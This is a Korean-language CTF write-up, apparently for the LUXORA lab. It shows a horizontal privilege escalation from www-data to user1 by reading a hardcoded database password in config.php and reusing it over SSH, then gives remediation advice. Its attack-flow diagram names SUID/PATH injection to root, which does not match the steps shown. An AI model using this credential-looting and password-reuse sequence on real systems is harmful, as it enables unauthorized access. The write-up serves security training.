+++
title = "VulnABLE CTF [LUXORA] Write-up: Horizontal Privilege Escalation (Flag 2)"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Privilege Escalation", "Information Gathering", "SSH", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Horizontal Privilege Escalation (Flag 2)

## 🎯 챌린지 개요
- **카테고리**: Privilege Escalation (수평적 권한 상승)
- **목표**: 획득한 초기 웹 서버 권한(`www-data`)을 이용하여 시스템 내부를 정찰하고, 설정 파일의 취약점(하드코딩된 비밀번호)을 찾아내어 일반 유저(`user1`)의 쉘(Shell)을 획득하라.

---

## 🕵️‍♂️ 1. 시스템 내부 정찰 (Internal Enumeration)

Flag 1 단계에서 획득한 리버스 셸을 통해 현재 우리는 타겟 서버 내부에 들어와 있습니다. 가장 먼저 현재 권한과 시스템에 존재하는 다른 사용자들을 파악해야 합니다.

### 현재 권한 및 시스템 유저 확인
```bash
$ whoami
www-data

$ ls -la /home
total 12
drwxr-xr-x  4 root  root  4096 Oct 10 12:00 .
drwxr-xr-x 20 root  root  4096 Oct 10 11:55 ..
drwxr-xr-x  5 user1 user1 4096 Nov 01 09:30 user1
```

**[해커의 사고 과정]**
1. 내 권한은 웹 서버를 구동하는 제한된 계정인 `www-data`이다.
2. `/home` 폴더를 보니 `user1`이라는 실제 시스템 계정이 존재한다.
3. 두 번째 플래그(Flag 2)는 분명 저 `user1`의 홈 디렉터리 안에 숨겨져 있을 것이다.
4. `cd /home/user1`을 시도해보지만 `Permission denied` 에러가 발생한다. 권한 상승(Privilege Escalation)이 필요하다!

---

## 💥 2. 취약점 탐색 (Vulnerability Identification)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Low Priv User ] --(Run SUID Binary / PATH Injection)--> [ Root Shell ]
```


`www-data` 권한으로 가장 쉽게 접근할 수 있으면서도 치명적인 정보가 담겨있는 곳은 바로 **웹 애플리케이션의 소스코드 및 설정 파일**입니다.

### 웹 루트 디렉터리 뒤지기 (Looting)
웹 서버의 기본 경로인 `/var/www/html` 또는 `/var/www` 내부를 샅샅이 뒤져봅니다.

```bash
$ cd /var/www/html
$ ls -la
total 24
drwxr-xr-x 3 www-data www-data 4096 Oct 10 12:05 .
drwxr-xr-x 3 root     root     4096 Oct 10 11:50 ..
-rw-r--r-- 1 www-data www-data  256 Oct 10 11:50 config.php
-rw-r--r-- 1 www-data www-data 1024 Oct 10 12:00 index.php
drwxr-xr-x 2 www-data www-data 4096 Oct 10 12:05 uploads
```

`config.php` 라는 아주 매력적인(?) 파일이 보입니다. 내용을 출력해 봅니다.

```bash
$ cat config.php
```

**[config.php 내용]**
```php
<?php
// Database configuration for LUXORA
$db_host = 'localhost';
$db_user = 'root';
$db_pass = 'SuperS3cr3tP@ssw0rd!';
$db_name = 'luxora_db';
?>
```

**[해커의 사고 과정]**
1. 빙고! 데이터베이스에 접속하기 위한 비밀번호 `SuperS3cr3tP@ssw0rd!` 를 획득했다.
2. 하지만 이 비밀번호는 데이터베이스용이다. 시스템 유저인 `user1`과 무슨 상관이 있을까?
3. 사람들은 기억력의 한계 때문에 여러 시스템에서 **동일한 비밀번호를 재사용(Password Reuse)**하는 경향이 매우 강하다.
4. 아까 Nmap 스캔 때 타겟 서버에 **22번 포트(SSH)**가 열려 있던 것이 생각난다. 저 비밀번호로 `user1` 계정에 SSH 접속을 시도해보자!

---

## 🚀 3. 수평적 권한 상승 수행 (Exploitation)

내 컴퓨터(해커 PC)의 터미널을 열고, 획득한 자격 증명(Credentials)을 활용해 SSH 로그인을 시도합니다.

### 패스워드 재사용 공격 (Password Reuse Attack)
```bash
$ ssh user1@10.10.10.10
```

비밀번호 입력 프롬프트가 뜨면, `config.php`에서 찾은 `SuperS3cr3tP@ssw0rd!` 를 입력합니다.

### 🔍 로그인 성공!
```text
user1@10.10.10.10's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

Last login: Wed Oct 10 14:22:10 2023 from 10.10.10.99
user1@vulnable:~$ whoami
user1
```

성공했습니다! 쉘의 주인이 `www-data`에서 `user1`으로 바뀌었습니다. 이를 같은 권한 레벨의 다른 유저로 넘어갔다고 하여 **수평적 권한 상승(Horizontal Privilege Escalation)**이라고 부릅니다.

---

## 🚩 4. 플래그 탐색 및 롸잇업 결론

이제 굳게 닫혀있던 `user1`의 안방 문을 열 수 있게 되었습니다.

```bash
user1@vulnable:~$ cd /home/user1
user1@vulnable:~$ ls -la
-rw-r--r-- 1 user1 user1  220 Oct 10 11:55 .bash_logout
-rw-r--r-- 1 user1 user1 3771 Oct 10 11:55 .bashrc
-rw-r--r-- 1 user1 user1  807 Oct 10 11:55 .profile
-rw-r----- 1 user1 user1   38 Nov 01 09:30 flag2.txt

user1@vulnable:~$ cat flag2.txt
THM{p4ssw0rd_r3us3_1s_d4ng3r0us}
```

**🔥 획득한 플래그:**
`THM{p4ssw0rd_r3us3_1s_d4ng3r0us}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 공격이 성공한 근본적인 이유는 시스템 관리자의 형편없는 비밀번호 관리 관행(Password Management) 때문입니다.

1. **비밀번호 재사용 금지 원칙 위반**
   - 웹 애플리케이션의 DB 접속용 비밀번호와 실제 리눅스 시스템 계정의 비밀번호를 똑같이 설정했습니다.
   - **패치**: DB 계정, 웹 관리자 계정, 시스템 쉘 계정의 비밀번호는 반드시 무작위로 다르게(Unique) 설정하고 패스워드 매니저를 통해 관리해야 합니다.

2. **설정 파일의 평문 저장 및 접근 권한 관리 부실**
   - `config.php`에 비밀번호가 평문(Plaintext)으로 하드코딩되어 있었습니다.
   - **패치**: 환경 변수(Environment Variables)나 HashiCorp Vault 같은 시크릿 관리 도구를 사용하여 소스코드에서 비밀번호를 분리해야 합니다.

3. **SSH 보안 설정 미비**
   - **패치**: SSH 서버(`/etc/ssh/sshd_config`) 설정에서 `PasswordAuthentication no` 로 설정하여, 오직 공개키(Public Key / `.pem`) 파일이 있는 사람만 접속할 수 있도록 강제해야 합니다. 이렇게 하면 비밀번호가 유출되더라도 해커가 SSH로 들어올 수 없습니다.